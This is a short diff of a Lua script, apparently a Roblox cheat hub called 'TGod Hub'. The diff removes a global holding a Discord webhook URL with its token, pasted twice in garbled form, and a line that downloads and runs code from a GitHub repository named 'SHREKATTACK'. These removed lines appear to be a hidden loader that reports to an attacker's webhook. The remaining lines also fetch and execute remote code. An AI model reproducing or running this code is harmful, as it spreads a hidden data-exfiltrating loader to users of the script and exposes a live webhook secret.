@@ -1,6 +1,3 @@
-_G.webhooksdiscord = "https://discord.com/api/webhooks/962266642212061244/SbHPEQJRKc-a1fOfZbberZ9epLZlP_GRHGpakGH02T4CYbMycZvNVSwQTqVXZ_Mnmp5ghttps://discord.com/api/webhooks/962266642212061244/SbHPEQJRKc-a1fOfZbberZ9epLZlP_GRHGpakGH02T4CYbMycZvNVSwQTqVXZ_Mnmp5g"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SHARKX516/SHREKATTACK/main/SHARKLOL2.lua%22),true)()
-
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
 local Window = Library.CreateLib("TGod Hub", "Midnight")
 
